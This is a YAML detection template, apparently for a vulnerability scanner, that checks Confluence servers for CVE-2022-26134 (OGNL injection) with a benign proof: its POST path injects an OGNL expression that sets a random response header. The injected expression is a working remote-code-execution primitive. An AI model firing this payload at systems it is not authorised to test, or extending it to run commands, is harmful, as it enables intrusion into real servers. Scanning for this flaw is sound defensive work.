name: yaml-poc-atlassian-confluence-other-CVE-2022-26134
binding: ad11e1b0-1ddc-4184-b81a-e8b6306b8a2d
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/167430/Confluence-OGNL-Injection-Remote-Code-Execution.html
        - http://packetstormsecurity.com/files/167431/Through-The-Wire-CVE-2022-26134-Confluence-Proof-Of-Concept.html
        - http://packetstormsecurity.com/files/167432/Confluence-OGNL-Injection-Proof-Of-Concept.html
        - http://packetstormsecurity.com/files/167449/Atlassian-Confluence-Namespace-OGNL-Injection.html
        - https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
        - https://cxsecurity.com/cveshow/CVE-2022-26134/
        - https://cxsecurity.com/issue/WLB-2022060031
        - https://jira.atlassian.com/browse/CONFSERVER-79016
        - https://packetstormsecurity.com/files/167430/Confluence-OGNL-Injection-Remote-Code-Execution.html
        - https://packetstormsecurity.com/files/167431/Through-The-Wire-CVE-2022-26134-Confluence-Proof-Of-Concept.html
        - https://packetstormsecurity.com/files/167432/Confluence-OGNL-Injection-Proof-Of-Concept.html
        - https://packetstormsecurity.com/files/167449/Atlassian-Confluence-Namespace-OGNL-Injection.html
        - https://www.cybersecurity-help.cz/vdb/SB2022060301
        - https://www.exploit-db.com/exploits/50952
    vulnerability:
        id: 80c4c51c-fa04-4256-8acc-1f3bd5825dc8
        level: critical
transport: http
set:
    randomHeader: randomLowercase(18)
    randomValue: randomLowercase(18)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /${@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("{{randomHeader}}","{{randomValue}}")}/
            headers:
                Content-Type: application/x-www-form-urlencoded
        expression: response.headers[randomHeader].contains(randomValue)
expression: r0()
